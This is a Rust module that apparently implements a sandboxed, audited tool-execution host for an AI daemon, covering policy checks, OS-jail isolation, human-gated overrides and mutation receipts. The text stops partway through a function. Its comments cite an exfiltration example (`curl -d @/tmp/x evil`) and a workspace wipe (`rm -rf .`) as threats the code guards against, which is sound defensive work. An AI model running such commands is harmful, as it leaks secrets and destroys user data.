//! ADR-013 Vision A — the daemon governed tool-execution host (A2-body).
//!
//! [`ToolHost`] runs fluers native tools (`read`/`write`/`edit`/`bash`/`glob`/
//! `grep`) over a [`LocalSessionEnv`], **behind** a [`FaeToolPolicy`] that
//! composes the control-plane scope check + a Fae-owned path/damage/egress
//! stack, with every decision producing a fail-closed audit row. This is the
//! governed entry point A3 (the protocol surface) will wrap in `toolhost.execute`;
//! raw [`fluers_core::Tool::execute`] is NOT exposed outside this module.
//!
//! **Vision-B boundary (unchanged):** no loop relocation, no
//! conductor-as-`ModelProvider`, no `RemoteSwiftTool`. The Swift multi-turn loop
//! still drives; it calls INTO this host for portable/native tool execution.
//!
//! This module is a sibling of `conductor/` (tool *execution* is a separate
//! daemon subsystem from *routing*) and is outside the mesh/metaopt boundary
//! guards (those protect the conductor core from x0x/metaopt deps; fluers is the
//! sanctioned substrate, and toolhost depends one-way on conductor governance).
//!
//! See `docs/plans/vision-a-a2-toolhost-scope-2026-06-29.md` (reviewer-approved;
//! owner accepted the networked→`safe` scope deviation 2026-06-29) for the full
//! design, the §4.1/§4.2 traps, and the open questions.

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use fluers_core::tool::{InvokeContext, Tool, ToolResult};
use fluers_core::ToolPolicy;
use fluers_runtime::{Limits, LocalSessionEnv, SessionEnv};
use serde_json::Value;
use tokio_util::sync::CancellationToken;

use crate::conductor::ConductorStore;
use crate::mcp::{McpCatalog, MCP_INVOKE_COMMAND, MCP_ISOLATION_LABEL, MCP_TOOL_PREFIX};
use crate::toolhost::audit::{
    AuditDecision, ConductorStoreAudit, ToolHostAudit, ToolHostAuditRecord,
};
use crate::toolhost::confirm::{
    build_detail, ConfirmDetail, ConfirmReply, ConfirmRequest, ToolConfirmation,
};
use crate::toolhost::egress::{DisabledGate, ToolEgressGate};
use crate::toolhost::policy::{EvalDecision, FaeToolPolicy, ToolHostGovernance};
use crate::toolhost::receipts::{ConductorStoreReceipts, MutationReceipt, ToolHostReceipts};
use fae_control_plane::{authorize, AuthzDecision, ClientRecord, Command, PROTOCOL_VERSION};

pub mod audit;
pub mod confirm;
pub mod damage;
pub mod egress;
pub mod isolation;
pub mod policy;
pub mod receipts;
pub mod root_confirm;

use crate::toolhost::isolation::{IsolationMode, JailedSessionEnv, ToolOrigin};

/// Resolve the current user's home directory for the protected-path damage
/// control's absolute-spelling scan (B3). `None` ⇒ only the `~`/`$HOME`/
/// `${HOME}` symbolic spellings are scanned (still fail-closed, just less
/// literal coverage).
fn resolve_home() -> Option<String> {
    std::env::var("HOME").ok().filter(|h| !h.is_empty())
}

/// The mutating tools that produce a receipt (B4). Read/glob/grep/networked are
/// non-mutating and never reach the receipt lane.
fn is_mutating_tool(tool: &str) -> bool {
    matches!(tool, "write" | "edit" | "bash")
}

/// A request to execute one tool call under governance.
#[derive(Debug, Clone)]
pub struct ToolHostRequest {
    /// The control-plane identity (scopes drive `authorize`).
    pub client: ClientRecord,
    /// Tool name (`read`, `write`, `bash`, …).
    pub tool: String,
    /// The tool's JSON input.
    pub input: Value,
    /// Correlation id (audit + fluers `InvokeContext`).
    pub call_id: String,
    /// Cooperative cancellation.
    pub cancel: CancellationToken,
    /// (B2) Where the call originated. Drives the required [`IsolationMode`]:
    /// non-interactive origins require the OS jail; an owner's interactive turn
    /// may run on the host. No `Default` — every construction states it.
    pub origin: ToolOrigin,
    /// (Security-override Wave 1) An OPTIONAL human-gated sandbox relaxation for
    /// THIS one call, minted by Swift AFTER a hardware click on the authorize card
    /// (never from the model's arguments). `None` ⇒ today's behavior, byte-identical
    /// (Invariant F). `Some` ⇒ the daemon re-validates every L-rule (origin, expiry,
    /// call_id, canonical tier) before relaxing exactly one Host-bash read-deny leaf.
    pub security_override: Option<SecurityOverride>,
    /// (Security-override Wave 2, FLAW-1 turn taint) When `true`, a Host-tier `bash`
    /// call runs network-denied + workspace-write-only INDEPENDENTLY of any override
    /// — Swift sets it on every bash that follows an approved Secrets-tier read in
    /// the SAME turn, so the read secret cannot be exfiltrated by a later split call
    /// (`curl -d @/tmp/x evil`). `false` ⇒ today's behavior, byte-identical
    /// (Invariant F). Honored only on Host bash; jailed calls already confine egress.
    pub network_denied: bool,
}

/// A human-gated, single-call sandbox override (the wire contract's top-level
/// `security_override` sibling of `toolhost.execute`). Minted ONLY by Swift after a
/// hardware click; the model can neither see nor set it. Every field is
/// re-validated daemon-side — the daemon trusts NONE of it blindly (Invariant H).
#[derive(Debug, Clone)]
pub struct SecurityOverride {
    /// MUST equal this request's `call_id` (L7 single-use binding). A mismatch is
    /// rejected — an override rides its own request and is never reused.
    pub call_id: String,
    /// The file the read-deny is relaxed for. The daemon RE-canonicalizes it (L4)
    /// and never trusts this literal string.
    pub target_path: String,
    /// ADVISORY tier ("general"|"secrets") for Swift UX only. The daemon RE-derives
    /// the authoritative tier from the canonical path and IGNORES this (L3).
    pub tier: String,
    /// "once" | "expiring" — advisory; the daemon honors the single-call binding
    /// (L7) and the absolute `expiry_ms` (L6) regardless.
    pub grant_kind: String,
    /// Absolute UNIX-epoch ms. Honored only while `now_ms() <= expiry_ms` (L6).
    pub expiry_ms: u64,
}

/// The daemon's per-call decision about a `security_override` (internal). The
/// relaxation is consumed ONLY by a Host-tier `bash` call; `Rejected` and `None`
/// both fall back to today's full read-deny (Invariant F).
#[derive(Debug)]
enum OverrideDecision {
    /// No override on the request — today's path, no audit row emitted.
    None,
    /// Every L-rule passed: relax this one canonical leaf for this call.
    Relax(isolation::HostBashRelax),
    /// The override was rejected (already audited); proceed with the full sandbox.
    Rejected,
}

/// The governed outcome of one tool call.
#[derive(Debug, Clone)]
pub struct ToolHostResult {
    /// The tool's output (only present when the policy allowed + the tool ran).
    pub output: ToolResult,
}

/// A tool-host error. Every non-`Ok` path is a deny (fail-closed).
#[derive(Debug, thiserror::Error)]
pub enum ToolHostError {
    /// The policy denied the call (scope, path, damage, egress, confirm, …).
    #[error("tool call denied: {0}")]
    Denied(String),
    /// The tool name was classified but is not in the registry (defense-in-depth;
    /// the policy should have denied it as unknown first).
    #[error("tool not registered: {0}")]
    UnknownTool(String),
    /// The underlying tool execution failed.
    #[error("tool execution failed: {0}")]
    Tool(String),
    /// The sandbox root could not be created.
    #[error("sandbox root error: {0}")]
    Sandbox(String),
}

/// The clock the host consults for `authorize`'s `now_ms` + audit timestamps.
pub trait ToolHostClock: Send + Sync {
    /// Milliseconds since the UNIX epoch.
    fn now_ms(&self) -> u64;
}

/// Production clock: reads `SystemTime::now()`.
#[derive(Default, Clone, Copy)]
pub struct SystemToolHostClock;

impl ToolHostClock for SystemToolHostClock {
    fn now_ms(&self) -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    }
}

/// The governed tool-execution host.
///
/// Owns the sandbox ([`LocalSessionEnv`]) + the tool registry, and runs every
/// call through [`FaeToolPolicy`] before dispatch. Construct via [`ToolHost::new`]
/// (A3 wires the real instance in `main.rs`; A2 proves the surface in tests).
pub struct ToolHost {
    #[allow(dead_code)] // exercised by execute(); kept for future A3 introspection.
    env: Arc<LocalSessionEnv>,
    /// Host-tier tools (bare fluers env — path-confined only).
    registry: HashMap<String, Arc<dyn Tool>>,
    /// (B2) Jailed-tier tools: identical set built over a [`JailedSessionEnv`]
    /// whose `exec` runs inside an OS sandbox. Selected per-call by isolation.
    jailed_registry: HashMap<String, Arc<dyn Tool>>,
    /// (B2) Whether the OS sandbox backend is present. When `false`, a call that
    /// *requires* the jail fails closed (deny) rather than degrading to host.
    jail_available: bool,
    audit: Arc<dyn ToolHostAudit>,
    /// (B4) Fail-closed mutation-receipt sink (write/edit/bash).
    receipts: Arc<dyn ToolHostReceipts>,
    egress: Arc<dyn ToolEgressGate>,
    clock: Arc<dyn ToolHostClock>,
    /// (A3→B) Temp sandbox vs durable workspace — drives the workspace-wipe
    /// damage control in `evaluate`.
    root_mode: crate::toolhost::policy::RootMode,
    /// (B3) Resolved home dir for the protected-path absolute-spelling scan.
    home: Option<String>,
    /// The canonical workspace root (the OS-jail write boundary). Reused by an
    /// approved Secrets-tier override to confine writes when it denies network (L5).
    root: PathBuf,
    /// (Phase G3) The declared external MCP tool catalog, if any. `mcp:`-prefixed
    /// calls route here (NOT through the fluers registries / OS jail). `None` ⇒
    /// no servers declared ⇒ every `mcp:` call denies `mcp_not_configured`.
    mcp: Option<Arc<McpCatalog>>,
}

/// (Phase G3 / #18) The delegation-loop LLM-facing spec for a declared `mcp:`
/// tool: the raw JSON input schema (verbatim — NOT a fluers `ParameterSchema`)
/// plus its description. Produced by [`ToolHost::mcp_tool_spec`].
#[derive(Debug, Clone)]
pub struct McpToolSpec {
    /// The tool's human description (empty string if the server gave none).
    pub description: String,
    /// The tool's raw JSON Schema for inputs, emitted verbatim.
    pub parameters: serde_json::Value,
}

impl ToolHost {
    /// Build a host over a fresh sandbox root with the default (fail-closed)
    /// audit + egress wiring.
    ///
    /// `store` is the shared conductor store (audit rows land in
    /// `toolhost_audit.jsonl`, a sibling of the conductor telemetry files —
    /// never `fae.db`). Networked tools use [`DisabledGate`] (all deny) until
    /// the conductor-backed 3-gate adapter is wired (A2.5/P7).
    ///
    /// # Errors
    /// Returns [`ToolHostError::Sandbox`] if the root cannot be created.
    pub async fn new(
        root: PathBuf,
        limits: Limits,
        store: Arc<ConductorStore>,
    ) -> Result<Self, ToolHostError> {
        Self::with_wiring(
            root,
            limits,
            Arc::new(ConductorStoreAudit::new(Arc::clone(&store))),
            Arc::new(ConductorStoreReceipts::new(store)),
            Arc::new(DisabledGate),
            Arc::new(SystemToolHostClock),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await
    }

    /// (A3→B) Build a host over an owner-approved DURABLE workspace root.
    /// Enables the workspace-wipe damage control (rm -rf . etc. deny before
    /// confirm). Use [`ToolHost::new`] for the ephemeral temp sandbox.
    pub async fn new_durable(
        root: PathBuf,
        limits: Limits,
        store: Arc<ConductorStore>,
    ) -> Result<Self, ToolHostError> {
        Self::with_wiring(
            root,
            limits,
            Arc::new(ConductorStoreAudit::new(Arc::clone(&store))),
            Arc::new(ConductorStoreReceipts::new(store)),
            Arc::new(DisabledGate),
            Arc::new(SystemToolHostClock),
            crate::toolhost::policy::RootMode::DurableWorkspace,
        )
        .await
    }

    /// Build a host with explicit audit/receipts/egress/clock wiring.
    #[allow(clippy::too_many_arguments)]
    async fn with_wiring(
        root: PathBuf,
        limits: Limits,
        audit: Arc<dyn ToolHostAudit>,
        receipts: Arc<dyn ToolHostReceipts>,
        egress: Arc<dyn ToolEgressGate>,
        clock: Arc<dyn ToolHostClock>,
        root_mode: crate::toolhost::policy::RootMode,
    ) -> Result<Self, ToolHostError> {
        // Resolve the canonical real root BEFORE building the env (the seatbelt
        // profile / landlock ruleset are generated from it verbatim). The dir is
        // created by LocalSessionEnv::new, so canonicalize afterwards.
        let env = Arc::new(
            LocalSessionEnv::new(root.clone(), limits)
                .await
                .map_err(|e| ToolHostError::Sandbox(e.to_string()))?,
        );
        let real_root = tokio::fs::canonicalize(&root)
            .await
            .map_err(|e| ToolHostError::Sandbox(e.to_string()))?;

        let index = |tools: Vec<Arc<dyn Tool>>| -> HashMap<String, Arc<dyn Tool>> {
            tools
                .into_iter()
                .map(|t| {
                    let name = t.definition().name.clone();
                    (name, t)
                })
                .collect()
        };
        let registry = index(fluers_runtime::tool::mvp_tools_with_limits(
            Arc::clone(&env) as Arc<dyn SessionEnv>,
            limits,
        ));
        // The jailed toolset shares the same inner env (reads/writes/glob/grep
        // are already fd-anchored); only `exec` is intercepted by the OS jail.
        let jailed_env: Arc<dyn SessionEnv> =
            Arc::new(JailedSessionEnv::new(Arc::clone(&env), real_root.clone()));
        let jailed_registry = index(fluers_runtime::tool::mvp_tools_with_limits(
            jailed_env, limits,
        ));
        Ok(Self {
            env,
            registry,
            jailed_registry,
            jail_available: isolation::jail_backend_available(),
            audit,
            receipts,
            egress,
            clock,
            root_mode,
            home: resolve_home(),
            root: real_root,
            mcp: None,
        })
    }

    /// (Phase G3) Attach the shared external MCP catalog. Built once at daemon
    /// startup and threaded into each per-session host at construction, so
    /// `mcp:<server>:<tool>` calls route to the governed MCP tier. A host without
    /// a catalog denies every `mcp:` call `mcp_not_configured`.
    #[must_use]
    pub fn with_mcp_catalog(mut self, catalog: Arc<McpCatalog>) -> Self {
        self.mcp = Some(catalog);
        self
    }

    /// The static tool definitions for the named tools (filtered by `allowed`),
    /// in the allowlist's order. Unknown names are skipped. Used by the native
    /// delegation loop (Phase F1) to build a RESTRICTED set of model tool
    /// schemas — the worker only sees the tools its `toolset` permits. The
    /// host/jailed registries carry identical definitions (only `exec` differs),
    /// so the host registry is authoritative here.
    #[must_use]
    pub fn tool_definitions(&self, allowed: &[String]) -> Vec<fluers_core::tool::ToolDefinition> {
        allowed
            .iter()
            .filter_map(|name| self.tool_definition(name))
            .collect()
    }

    /// The fluers registry [`ToolDefinition`] for a SINGLE tool, or `None` if the
    /// name is not a registered fluers tool. The delegation loop's
    /// `build_tool_specs` calls this per-name so it can branch `mcp:` names off to
    /// the raw-schema path ([`mcp_tool_spec`](Self::mcp_tool_spec)) — MCP tools are
    /// external subprocesses, never fluers registry tools.
    #[must_use]
    pub fn tool_definition(&self, name: &str) -> Option<fluers_core::tool::ToolDefinition> {
        self.registry.get(name).map(|tool| tool.definition())
    }

    /// (Phase G3 / #18) The delegation-loop LLM-facing schema for a declared
    /// `mcp:<server>:<tool>` tool, or `None` unless MCP is configured AND the tool
    /// is declared + allowlisted in the catalog — the SAME fail-closed catalog gate
    /// [`execute_mcp`](Self::execute_mcp) steps 1 + 4 apply, so this never widens
    /// what a delegated turn may call. The `Delegated` origin is already permitted
    /// for MCP (`execute_mcp` step 2), so a declared tool in the delegated toolset
    /// is genuinely invocable; a non-declared name would earn a runtime
    /// `mcp_tool_not_declared` deny and so must NOT be advertised. The raw JSON
    /// input schema is returned verbatim (MCP schemas may not round-trip fluers
    /// `ParameterSchema`).
    #[must_use]
    pub fn mcp_tool_spec(&self, name: &str) -> Option<McpToolSpec> {
        let mtool = self.mcp.as_ref()?.get(name)?;
        Some(McpToolSpec {
            description: mtool.description.clone().unwrap_or_default(),
            parameters: mtool.input_schema.clone(),
        })
    }

    /// The governed entry point. Runs the policy; on `Allow` dispatches the
    /// tool. This is the ONLY public path to tool execution.
    ///
    /// # Errors
    /// [`ToolHostError::Denied`] for any policy deny (incl. the §4.1 confirm
    /// trap); [`ToolHostError::UnknownTool`] for a classified-but-unregistered
    /// tool; [`ToolHostError::Tool`] for an execution failure.
    pub async fn execute(&self, req: ToolHostRequest) -> Result<ToolHostResult, ToolHostError> {
        // (Phase G3) `mcp:` tools are external subprocesses, not fluers registry
        // tools — route them to the dedicated gate (scope/origin/allowlist), NOT
        // the FaeToolPolicy path (which would classify them `unknown_tool`).
        if req.tool.starts_with(MCP_TOOL_PREFIX) {
            return self.execute_mcp(&req).await;
        }
        let isolation = req.origin.required_isolation();
        let gov = Arc::new(ToolHostGovernance {
            client: req.client.clone(),
            audit: Arc::clone(&self.audit),
            egress: Arc::clone(&self.egress),
            now_ms: self.clock.now_ms(),
            call_id: req.call_id.clone(),
            root_mode: self.root_mode,
            home: self.home.clone(),
            isolation,
        });
        let policy = FaeToolPolicy::new(Arc::clone(&gov));
        self.guard_isolation(&policy, &req, isolation)?;
        // Security-override Wave 1: validate + audit any human-gated override BEFORE
        // dispatch. `None`/`Rejected` leave the sandbox at today's full deny.
        let override_decision = self.evaluate_security_override(&req, isolation);
        let ctx = InvokeContext {
            tool_call_id: req.call_id.clone(),
            cancel: req.cancel.clone(),
        };
        match policy.check(&req.tool, &req.input, &ctx).await {
            fluers_core::PolicyVerdict::Allow => {}
            fluers_core::PolicyVerdict::Confirm(reason) => {
                // Defense-in-depth: FaeToolPolicy must NEVER emit Confirm (the
                // fluers loop treats it as Allow). If it leaks, deny + audit.
                gov.audit
                    .record(crate::toolhost::audit::ToolHostAuditRecord {
                        event_type: "tool_policy",
                        ts_ms: gov.now_ms,
                        tool: req.tool.clone(),
                        call_id: req.call_id.clone(),
                        decision: crate::toolhost::audit::AuditDecision::Denied,
                        reason: "confirm_leaked_from_policy".into(),
                        risk_class: "Unknown",
                        isolation: gov.isolation.as_label(),
                    })
                    .ok();
                return Err(ToolHostError::Denied(format!(
                    "confirm leaked from policy: {reason}"
                )));
            }
            fluers_core::PolicyVerdict::Deny(reason) => {
                return Err(ToolHostError::Denied(reason));
            }
        }
        self.run_tool(&req, isolation, &override_decision).await
    }

    /// Governed execute WITH owner confirmation (A3 — the production path for
    /// `toolhost.execute`). Runs [`FaeToolPolicy::evaluate`]; on
    /// `NeedsConfirmation` performs the `tool.confirm` round-trip via
    /// `confirmation`. On approval the tool runs; any deny / timeout /
    /// disconnect / malformed reply fails closed.
    ///
    /// Distinct from [`execute`](Self::execute) (the fluers-loop path, which
    /// denies on `NeedsConfirmation`): this is the path that actually lets a
    /// dangerous tool proceed, behind the confirmation channel.
    pub async fn execute_governed(
        &self,
        req: ToolHostRequest,
        confirmation: &dyn ToolConfirmation,
    ) -> Result<ToolHostResult, ToolHostError> {
        // (Phase G3) External MCP tools never need the owner-confirm round-trip;
        // route them to the dedicated gate before the native path builds.
        if req.tool.starts_with(MCP_TOOL_PREFIX) {
            return self.execute_mcp(&req).await;
        }
        let isolation = req.origin.required_isolation();
        let gov = Arc::new(ToolHostGovernance {
            client: req.client.clone(),
            audit: Arc::clone(&self.audit),
            egress: Arc::clone(&self.egress),
            now_ms: self.clock.now_ms(),
            call_id: req.call_id.clone(),
            root_mode: self.root_mode,
            home: self.home.clone(),
            isolation,
        });
        let policy = FaeToolPolicy::new(Arc::clone(&gov));
        self.guard_isolation(&policy, &req, isolation)?;
        // Security-override Wave 1: validate + audit any human-gated override BEFORE
        // the confirm round-trip / dispatch. `None`/`Rejected` ⇒ full sandbox.
        let override_decision = self.evaluate_security_override(&req, isolation);
        let ev = policy.evaluate(&req.tool, &req.input).await;
        match ev.decision {
            EvalDecision::Allow => {
                if !policy.record_audit(&req.tool, ev.risk_label, AuditDecision::Allowed, "allowed")
                {
                    return Err(ToolHostError::Denied("audit_write_failed".into()));
                }
                // B4: fail-closed mutation receipt BEFORE execution.
                self.write_receipt_or_deny(&req, ev.risk_label, "allowed", gov.now_ms)
                    .await?;
                self.run_tool(&req, isolation, &override_decision).await
            }
            EvalDecision::Deny(reason) => {
                let _ =
                    policy.record_audit(&req.tool, ev.risk_label, AuditDecision::Denied, &reason);
                Err(ToolHostError::Denied(reason))
            }
            EvalDecision::NeedsConfirmation(reason) => {
                // Build the bounded, redacted payload (scope §6.3).
                let old_exists = self.probe_old_exists(&req.tool, &req.input).await;
                let detail = match build_detail(&req.tool, &req.input, old_exists) {
                    Some(d) => d,
                    None => {
                        // A dangerous tool we can't summarize: deny rather than
                        // send a useless/ambiguous prompt.
                        let r = "confirm_detail_unbuildable";
                        let _ =
                            policy.record_audit(&req.tool, ev.risk_label, AuditDecision::Denied, r);
                        return Err(ToolHostError::Denied(r.into()));
                    }
                };
                let creq = ConfirmRequest {
                    tool: req.tool.clone(),
                    call_id: req.call_id.clone(),
                    risk_class: ev.risk_label.to_string(),
                    reason,
                    detail,
                };
                match confirmation.confirm(&creq).await {
                    ConfirmReply::Approved => {
                        if !policy.record_audit(
                            &req.tool,
                            ev.risk_label,
                            AuditDecision::Allowed,
                            "confirmed_by_owner",
                        ) {
                            return Err(ToolHostError::Denied("audit_write_failed".into()));
                        }
                        // B4: fail-closed mutation receipt BEFORE execution.
                        self.write_receipt_or_deny(
                            &req,
                            ev.risk_label,
                            "confirmed_by_owner",
                            gov.now_ms,
                        )
                        .await?;
                        self.run_tool(&req, isolation, &override_decision).await
                    }
                    ConfirmReply::Denied(r) => {
                        let _ = policy.record_audit(
                            &req.tool,
                            ev.risk_label,
                            AuditDecision::Denied,
                            &r,
                        );
                        Err(ToolHostError::Denied(r))
                    }
                }
            }
        }
    }

    /// Fail-closed isolation gate (B2): if the call *requires* the OS jail but
    /// no backend is available, deny + audit BEFORE any policy evaluation or
    /// tool dispatch — never silently degrade to host execution.
    fn guard_isolation(
        &self,
        policy: &FaeToolPolicy,
        req: &ToolHostRequest,
        isolation: IsolationMode,
    ) -> Result<(), ToolHostError> {
        if isolation.requires_backend() && !self.jail_available {
            let reason = "isolation_unavailable";
            let _ = policy.record_audit(&req.tool, "Unknown", AuditDecision::Denied, reason);
            return Err(ToolHostError::Denied(reason.into()));
        }
        Ok(())
    }

    /// Dispatch an already-policy-checked tool call (the shared tail of
    /// [`execute`](Self::execute) and [`execute_governed`](Self::execute_governed)).
    /// `isolation` selects the tier: [`Jailed`](IsolationMode::Jailed) routes to
    /// the OS-sandboxed toolset, [`Host`](IsolationMode::Host) to the bare env.
    async fn run_tool(
        &self,
        req: &ToolHostRequest,
        isolation: IsolationMode,
        override_decision: &OverrideDecision,
    ) -> Result<ToolHostResult, ToolHostError> {
        let ctx = InvokeContext {
            tool_call_id: req.call_id.clone(),
            cancel: req.cancel.clone(),
        };
        let registry = match isolation {
            IsolationMode::Jailed => &self.jailed_registry,
            IsolationMode::Host => &self.registry,
        };
        let Some(tool) = registry.get(&req.tool) else {
            return Err(ToolHostError::UnknownTool(req.tool.clone()));
        };
        // C1+C2: on the Host tier the fluers `bash` tool runs `sh -c <command>`
        // over the bare `LocalSessionEnv` with the daemon's full ambient env and
        // no OS sandbox. Rewrite the command so it runs env-scrubbed and (macOS)
        // under a seatbelt that denies reads of the protected paths. Fails closed
        // if isolation can't be enforced. Only `bash` needs this (read/write/edit/
        // glob/grep are fd-anchored + path-confined by fluers already).
        let input = self.effective_tool_input(req, isolation, override_decision)?;
        let output = tool
            .execute(ctx, input)
            .await
            .map_err(|e| ToolHostError::Tool(e.to_string()))?;
        Ok(ToolHostResult { output })
    }

    /// Validate + audit a request's optional `security_override` (Wave 1). Returns
    /// the per-call [`OverrideDecision`] the read-deny profile builder consumes.
    ///
    /// Fail-closed at every step (Invariant F): a `None` field is today's path with
    /// NO audit; any present field that fails ANY L-rule is [`Rejected`] (audited)
    /// and the call runs under the FULL sandbox. Only a field that clears every gate
    /// yields [`Relax`], and only after the accept-audit write succeeds (matching the
    /// project's allow-path convention: an audit-write failure denies the relaxation).
    ///
    /// - **L1** origin gate: reject unless `req.origin == OwnerInteractive`.
    /// - **L7** single-use: reject unless `security_override.call_id == req.call_id`.
    /// - **L6** expiry: reject unless `now_ms() <= expiry_ms` (boundary inclusive).
    /// - **L4** canonicalize: reject a target that fails to resolve or is a directory.
    /// - **L3** tier: reject a Fae-Integrity/never target; Secrets ⇒ `deny_network`.
    ///
    /// [`Relax`]: OverrideDecision::Relax
    /// [`Rejected`]: OverrideDecision::Rejected
    fn evaluate_security_override(
        &self,
        req: &ToolHostRequest,
        isolation: IsolationMode,
    ) -> OverrideDecision {
        let Some(ov) = req.security_override.as_ref() else {
            return OverrideDecision::None;
        };
        let iso = isolation.as_label();
        // L1 — origin gate. The override channel is the owner's interactive turn
        // only; a proactive/scheduler/script/delegated origin carrying an override
        // is a red flag → reject + audit.
        if req.origin != ToolOrigin::OwnerInteractive {
            self.audit_override(
                req,
                iso,
                AuditDecision::Denied,
                "reject_non_interactive_origin",
            );
            return OverrideDecision::Rejected;
        }
        // L7 — single-use binding to THIS call.
        if ov.call_id != req.call_id {
            self.audit_override(req, iso, AuditDecision::Denied, "reject_call_id_mismatch");
            return OverrideDecision::Rejected;
        }
        // L6 — absolute expiry (boundary inclusive), daemon clock.
        if self.clock.now_ms() > ov.expiry_ms {
            self.audit_override(req, iso, AuditDecision::Denied, "reject_expired");
            return OverrideDecision::Rejected;
        }
        // The protected-path tier table is home-anchored; without a home we cannot
        // classify → fail closed.
        let Some(home) = self.home.as_deref() else {
            self.audit_override(req, iso, AuditDecision::Denied, "reject_home_unresolved");
            return OverrideDecision::Rejected;
        };
        // L4 — canonicalize (resolves symlinks + `..`); reject if it does not
        // resolve or resolves to a directory (file-granular only).
        let canonical = match std::fs::canonicalize(&ov.target_path) {
            Ok(p) => p,
            Err(_) => {
                self.audit_override(req, iso, AuditDecision::Denied, "reject_uncanonicalizable");
                return OverrideDecision::Rejected;
            }
        };
        if canonical.is_dir() {
            self.audit_override(req, iso, AuditDecision::Denied, "reject_directory");
            return OverrideDecision::Rejected;
        }
        // L3 — daemon RE-derives the authoritative tier from the canonical path
        // (ignoring the advisory `ov.tier`). Fae-Integrity is never overridable.
        let deny_network = match isolation::classify_canonical_tier(&canonical, home) {
            isolation::SecurityTier::FaeIntegrity => {
                self.audit_override(req, iso, AuditDecision::Denied, "reject_never_path");
                return OverrideDecision::Rejected;
            }
            isolation::SecurityTier::Secrets => true, // L5: Secrets unlock also cuts network.
            isolation::SecurityTier::General => false,
        };
        // Accept — audit BEFORE relaxing. Fail closed if the audit write fails (the
        // allow-path convention): a relaxation that cannot be recorded is denied.
        let reason = format!(
            "accepted:{}:{}",
            if deny_network { "secrets" } else { "general" },
            canonical.display()
        );
        if !self.audit_override(req, iso, AuditDecision::Allowed, &reason) {
            return OverrideDecision::Rejected;
        }
        OverrideDecision::Relax(isolation::HostBashRelax {
            canonical_target: canonical,
            deny_network,
            workspace_root: self.root.clone(),
        })
    }

    /// Emit one `security_override` audit row (mirrors the deny-audit pattern). The
    /// `reason` carries the outcome (`accepted:…` / `reject_*`). Returns `false` if
    /// the audit sink rejected the write (so an accept can fail closed); a failed
    /// reject-audit is logged loudly but the call already proceeds under full deny.
    fn audit_override(
        &self,
        req: &ToolHostRequest,
        isolation: &'static str,
        decision: AuditDecision,
        reason: &str,
    ) -> bool {
        let record = ToolHostAuditRecord {
            event_type: "security_override",
            ts_ms: self.clock.now_ms(),
            tool: req.tool.clone(),
            call_id: req.call_id.clone(),
            decision,
            reason: reason.to_string(),
            risk_class: "SecurityOverride",
            isolation,
        };
        match self.audit.record(record) {
            Ok(()) => true,
            Err(err) => {
                tracing::error!(
                    tool = %req.tool,
                    call_id = %req.call_id,
                    reason,
                    "fae-daemon: security_override audit write FAILED: {err}"
                );
                false
            }
        }
    }

    /// The tool input actually dispatched. Identity for every tool EXCEPT a
    /// Host-tier `bash` call, whose `command` is rewritten by
    /// [`isolation::wrap_host_bash_command`] (C1 env scrub + C2 macOS protected-
    /// read deny). Fails closed (`Denied`) if isolation cannot be enforced —
    /// never silently runs an unsandboxed Host bash.
    fn effective_tool_input(
        &self,
        req: &ToolHostRequest,
        isolation: IsolationMode,
        override_decision: &OverrideDecision,
    ) -> Result<Value, ToolHostError> {
        if isolation != IsolationMode::Host || req.tool != "bash" {
            return Ok(req.input.clone());
        }
        let Some(command) = req.input.get("command").and_then(Value::as_str) else {
            // No `command` field: let the fluers `bash` tool reject it itself.
            return Ok(req.input.clone());
        };
        // Only a validated `Relax` lifts a read-deny leaf; `None`/`Rejected` pass
        // `None` ⇒ the profile is byte-identical to today's full deny (Invariant F).
        let relax = match override_decision {
            OverrideDecision::Relax(r) => Some(r),
            OverrideDecision::None | OverrideDecision::Rejected => None,
        };
        // FLAW-1 turn taint: a network-denied bash (Swift sets this on every bash
        // after an approved Secrets read in the turn) confines writes to the
        // workspace root + temp and denies network, independent of any override.
        let network_denied_root: Option<&std::path::Path> = if req.network_denied {
            Some(self.root.as_path())
        } else {
            None
        };
        match isolation::wrap_host_bash_command(
            command,
            self.home.as_deref(),
            relax,
            network_denied_root,
        ) {
            Ok(wrapped) => {
                let mut input = req.input.clone();
                if let Value::Object(map) = &mut input {
                    map.insert("command".to_string(), Value::String(wrapped));
                }
                Ok(input)
            }
            Err(reason) => {
                tracing::error!(
                    tool = %req.tool,
                    call_id = %req.call_id,
                    reason,
                    "host bash isolation unavailable — denying (fail closed)"
                );
                Err(ToolHostError::Denied(reason.into()))
            }
        }
    }

    /// Cheap existence probe for the file a write/edit targets (feeds the
    /// confirm payload's `old_exists` flag). Uses `read_file_full` with the edit
    /// byte cap: Ok ⇒ exists; `FileTooLarge` ⇒ exists (big); any other error ⇒
    /// absent. This is informational, not a gate (path/damage already ran in
    /// `evaluate`). (oracle MAJOR-4: was `read_file_full(path, 1)`, which
    /// reported false for any existing file > 1 byte.)
    async fn probe_old_exists(&self, tool: &str, input: &Value) -> bool {
        if !matches!(tool, "write" | "edit") {
            return false;
        }
        let Some(path) = input.get("path").and_then(Value::as_str) else {
            return false;
        };
        use fluers_runtime::RuntimeError;
        match self
            .env
            .read_file_full(std::path::Path::new(path), Limits::default().max_edit_bytes)
            .await
        {
            // File read fully ⇒ exists.
            Ok(_) => true,
            // File exists but exceeds the cap ⇒ exists (just large).
            Err(RuntimeError::FileTooLarge { .. }) => true,
            // Not found / unreadable / path issue ⇒ treat as absent.
            Err(_) => false,
        }
    }

    /// (B4) Write the fail-closed mutation receipt for a mutating tool BEFORE it
    /// executes. Non-mutating tools (read/glob/grep) are a no-op. A receipt-write
    /// failure returns [`ToolHostError::Denied`] so the mutation never runs.
    async fn write_receipt_or_deny(
        &self,
        req: &ToolHostRequest,
        risk_label: &'static str,
        outcome: &'static str,
        ts_ms: u64,
    ) -> Result<(), ToolHostError> {
        if !is_mutating_tool(&req.tool) {
            return Ok(());
        }
        // Bounded, redacted summary — the SAME shape the confirm channel sends
        // (never file content). `old_exists` reuses the confirm probe.
        let old_exists = self.probe_old_exists(&req.tool, &req.input).await;
        let detail = match build_detail(&req.tool, &req.input, old_exists) {
            Some(d) => d,
            // A mutating tool we cannot summarize: fail closed rather than run an
            // unrecorded mutation.
            None => return Err(ToolHostError::Denied("receipt_detail_unbuildable".into())),
        };
